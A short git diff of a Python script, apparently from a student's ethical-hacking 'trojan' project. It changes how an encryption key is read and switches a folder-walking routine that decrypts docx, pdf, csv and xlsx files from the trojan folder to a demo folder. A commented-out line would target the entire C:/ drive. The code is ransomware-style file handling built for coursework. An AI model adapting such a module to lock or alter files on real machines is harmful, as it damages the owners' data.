@@ -14,18 +14,18 @@ def decrypt_file(key,file_path):
 
 
 load_dotenv(dotenv_path='./.env',override=True)
-ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY')            # voor testing heb ik geen env file. daarom kan het zijn dat ik dat manueel moet ingeven
+
+ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY').replace('\\', '')[1:]            # voor testing heb ik geen env file. daarom kan het zijn dat ik dat manueel moet ingeven
 
 
 if ENCRYPTION_KEY == "":
-    ENCRYPTION_KEY = input("input u key").strip().encode()
-
-key = ENCRYPTION_KEY
+    ENCRYPTION_KEY = input("input u key").strip()
+key = ENCRYPTION_KEY.encode()
 
 file_types = ["docx", "pdf", "csv", "xlsx"]   # , "md", "txt"
 
 # path = "C:/"                     # voor alle files af te runnen ipv 1 file
-path = "C:/Users/michi/School/AP/jaar4/ethicalHacking/Deel2/trojan/modules"
+path = "C:/Users/michi/School/AP/jaar4/ethicalHacking/Deel2/demofolder"
 for root, dirs, files in os.walk(path):
     for file in files:
         file_path = os.path.join(root, file)
